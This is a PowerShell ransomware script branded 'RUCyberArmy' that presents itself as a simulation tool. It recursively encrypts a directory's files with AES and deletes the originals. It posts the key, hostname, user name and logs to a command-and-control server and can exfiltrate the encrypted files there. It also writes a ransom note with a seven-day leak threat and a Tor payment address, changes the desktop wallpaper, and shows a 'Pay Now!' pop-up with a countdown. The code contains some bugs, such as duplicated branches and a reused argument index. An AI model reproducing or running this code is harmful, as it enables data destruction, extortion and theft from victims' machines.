# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "RUCyberArmy - by @BZHack" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }

# Banner
function Show-Banner {
   Write-Host 
   Write-Host "##################" -ForegroundColor White
   Write-Host "##################" -ForegroundColor Blue
   Write-Host "##################" -ForegroundColor Red
   Write-Host                                                            
   Write-Host "  ----------------- by @RUCyberArmy ----------------  " -ForegroundColor Green }

# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
   Write-Host "        generic ransomware in PowerShell with C2 capabilities"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\RUCyberArmy.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
   Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
   Write-Host ; Write-Host "        .\RUCyberArmy.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
   Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }

# Variables
$Mode = $args[0]
$Directory = $args[1]
$PSRKey = $args[3]
$C2Server = $args[3]
$C2Port = $args[5]
$Exfil = $args[6]
$C2Status = $null

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($null -eq $args[0]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($null -eq $args[1]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($null -eq $args[2]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($null -eq $args[3]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "000_readme.txt" ; $KeyFile = "000_key.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [ValidateSet("Encrypt", "Decrypt")]
       [String]$Mode,

       [Parameter(Mandatory = $true)]
       [String]$Key,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256 }

   Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

         "Encrypt" {
             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".rsm" }

             $encryptor = $aesManaged.CreateEncryptor()
             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
             $encryptedBytes = $aesManaged.IV + $encryptedBytes
             $aesManaged.Dispose()

             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

         "Decrypt" {
             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".rsm","") }

             $aesManaged.IV = $cipherBytes[0..15]
             $decryptor = $aesManaged.CreateDecryptor()
             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
             $aesManaged.Dispose()

             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}

  End {
      $shaManaged.Dispose()
      $aesManaged.Dispose()}}

function RemoveWallpaper {
$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
 
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};

public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}

public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};

RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };

SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
 
"@
try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}

function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 
Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/PSRansom.ico -Outfile $env:temp\RUCyberArmy.ico
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()

$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false;
$form.Size = New-Object System.Drawing.Size(900,600) 
$form.BackColor = "Black" 
$form.MaximizeBox = $false 
$form.StartPosition = "CenterScreen" 
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "Fixed3D"
$form.Text = "RUCyberArmy"
$formIcon = New-Object system.drawing.icon ("$env:temp\RUCyberArmy.ico") 
$form.Icon = $formicon  

$img = [System.Drawing.Image]::Fromfile("$env:temp\RUCyberArmy.jpg")
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = 920
$pictureBox.Height = 370
$pictureBox.SizeMode = "StretchImage"
$pictureBox.Image = $img
$form.controls.add($pictureBox)

$label = New-Object System.Windows.Forms.Label
$label.ForeColor = "Cyan"
$label.Text = "All your files have been encrypted by RUCyberArmy!" 
$label.AutoSize = $true 
$label.Location = New-Object System.Drawing.Size(50,400) 
$font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$form.Controls.Add($label) 

$label1 = New-Object System.Windows.Forms.Label
$label1.ForeColor = "White"
$label1.Text = "But don't worry, you can still recover them with the recovery key :)" 
$label1.AutoSize = $true 
$label1.Location = New-Object System.Drawing.Size(50,450)
$font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$form.Controls.Add($label1) 

$okbutton = New-Object System.Windows.Forms.Button;
$okButton.Location = New-Object System.Drawing.Point(750,500)
$okButton.Size = New-Object System.Drawing.Size(110,35)
$okbutton.ForeColor = "Black"
$okbutton.BackColor = "White"
$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$okButton.Text = 'Pay Now!'
$okbutton.Visible = $false
$okbutton.Enabled = $true
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Follow instruction in 000_readme.txt', 'RUCyberArmy Payment System',
[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)
$form.Activate() 2>&1> $null
$form.Focus() 2>&1> $null

$btn=New-Object System.Windows.Forms.Label
$btn.Location = New-Object System.Drawing.Point(50,500)
$btn.Width = 500
$form.Controls.Add($btn)
$btn.ForeColor = "Red"
$startTime = [DateTime]::Now
$count = 10.6
$timer=New-Object System.Windows.Forms.Timer
$timer.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
if ($remainingSeconds -like "-0.1*"){ $timer.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
$btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
$timer.Start()

$btntest = $form.ShowDialog()
if ($btntest -like "OK"){ $Global:PayNow = "True" }}
Remove-Item $env:temp\RUCyberArmy* -force

function R64Encoder { 
   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }

function ShowInfo {
   Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
   Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
   Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }

function GetStatus {
   Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}

function SendResults {
   $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
   $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "RUCyberArmy!" -NotMatch
   $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
   Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }

function SendClose {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null }

function SendPay {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null }

function SendOK {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }

function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by RUCyberArmy!`nBut don't worry, you can still recover them with the recovery key :)`n"
   Remove-Item "$Directory$slash$Readme", Remove-Item "$Directory$slash$KeyFile" ; Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
   Add-Content -Path "$Directory$slash$Readme" -Value "You have 7 days to pay or we relase all data ! `n"
   Add-Content -Path "$Directory$slash$Readme" -Value "Use tor browser to get to the url and follow instruction `n"
   Add-Content -Path "$Directory$slash$Readme" -Value "tor url: pvowp2vlvw3opehyn4q2kg4f43phyaywadix3f5rmcfpt6e7teaehaad.onion `n"
   Add-Content -Path "$Directory$slash$Readme" -Value "Victim ID: 5079aa56-343a-11ed-a261-0242ac120002 `n" }

function EncryptFiles {
   Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
   $files = Get-ChildItem $Directory -Recurse -Exclude *.rsm,000_key.txt,000_readme.txt,000_RUCyberArmy.jpg  -File
   foreach ($file in $files.FullName) 
   { 
      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $file
      Add-Content -Path "$Directory$slash$Readme" -Value "[!] $file is now encrypted"
      Remove-Item $file
   }
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "RUCyberArmy!" -NotMatch
   if (!$RansomLogs) { 
      Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" 
   }
}

function EncryptFilesSafe {
   Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
   $files = Get-ChildItem $Directory -Recurse -Exclude *.rsm,000_key.txt,000_readme.txt,000_RUCyberArmy.jpg -File
   foreach ($file in $files.FullName) 
   { 
      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $file
      Add-Content -Path "$Directory$slash$Readme" -Value "[!] $file is now encrypted"
      (Get-Item $file).Attributes += [io.fileattributes]::Hidden
   }
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "RUCyberArmy!" -NotMatch
   if (!$RansomLogs) { 
      Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" 
   }
}

function ExfiltrateFiles {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" 
   if (!$RansomLogs) {
      $files = Get-ChildItem $Directory -recurse -filter *.rsm -File
      foreach ($file in $files.FullName) {
         $Pfile = $file.split($slash)[-1]
         $B64file = R64Encoder -f $file
         $B64Name = R64Encoder -t $Pfile
         Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null 
      }
   }
   else {
      $B64Name = R64Encoder -t "none.null" 
      Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null 
   }
}

function DecryptFiles {
   $files = Get-ChildItem $Directory -Recurse -Filter *.rsm -File
   foreach ($file in $files.FullName) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $file ; $rfile = $file.replace(".rsm","")
      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue 
   }
   Remove-Item "$Directory$slash$Readme"
   (Get-Item $Directory$slash$KeyFile -Force).Attributes -= [io.fileattributes]::Hidden
   Remove-Item "$Directory$slash$KeyFile"
   Remove-Item "$Directory\RUCyberArmy.jpg"
}

function DecryptFilesSafe {
   $filesencrypt = Get-ChildItem $Directory -Recurse -Filter *.rsm -File
   foreach ($filesencrypt in $filesencrypt.FullName) {
      Remove-Item $filesencrypt
      Write-Host "[+] $filesencrypt is now removed" -ForegroundColor Blue 
   }
   $files = Get-ChildItem $Directory -Recurse -File -Force
   foreach ($file in $files.FullName) {
      (Get-Item $file -Force).Attributes -= [io.fileattributes]::Hidden
      Write-Host "[+] $file is now unhidden" -ForegroundColor Blue 
   }
   Remove-Item "$Directory$slash$Readme"
   Remove-Item "$Directory\RUCyberArmy.jpg"
}

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.rsm ; if ($RFiles) { $RFiles | Remove-Item } else {
   Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Recovering ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
   DecryptFiles ; CheckFiles ; Start-Sleep 1 }
   elseif ($Mode -eq "-sd") {
      Write-Host ; Write-Host "[!] Recovering ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
      Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
      DecryptFilesSafe ; CheckFiles ; Start-Sleep 1 }
   
   elseif ($Mode -eq "-se"){
   Write-Host ; Write-Host "[!] Starting ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
   $C2Status = GetStatus ; Start-Sleep 1
   
   Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
   if ($C2Status) { SendResults ; Start-Sleep 1}
   Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
   CreateReadme ; EncryptFilesSafe ; if ($C2Status) { SendResults ; Start-Sleep 1
   
   if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
      ExfiltrateFiles ; Start-Sleep 1 }}
   
   if (!$C2Status) { Write-Host "[+] Saving logs and key in 000_readme.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}
   elseif ($Mode -eq "-se"){
      Write-Host ; Write-Host "[!] Starting ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
      Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
      $C2Status = GetStatus ; Start-Sleep 1
   
      Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
      SendResults
   
      if (!$C2Status) { Write-Host "[+] Saving logs in 000_readme.txt.. and key in 000_key.txt" -ForegroundColor Blue
          Add-Content -Path "$Directory$slash$KeyFile" -Value "Recovery Key: $PSRKey"
         (Get-Item $Directory$slash$KeyFile).Attributes += [io.fileattributes]::Hidden }
      else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }
   
   
      Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
      CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; Start-Sleep 1
   
      if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
         ExfiltrateFiles ; Start-Sleep 1 }}
   
      }
   elseif ($Mode -eq "-e"){
      Write-Host ; Write-Host "[!] Starting ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
      Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
      $C2Status = GetStatus ; Start-Sleep 1
   
      Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
      SendResults
   
      if (!$C2Status) { Write-Host "[+] Saving logs in 000_readme.txt.. and key in 000_key.txt" -ForegroundColor Blue
          Add-Content -Path "$Directory$slash$KeyFile" -Value "Recovery Key: $PSRKey"
         (Get-Item $Directory$slash$KeyFile).Attributes += [io.fileattributes]::Hidden }
      else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }
   
   
      Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
      CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; Start-Sleep 1
   
      if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
         ExfiltrateFiles ; Start-Sleep 1 }}
   
      }

else {
   Show-Help
   }

   if ($args -like "-full") { RemoveWallpaper ; PopUpRansom
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }

Start-Sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
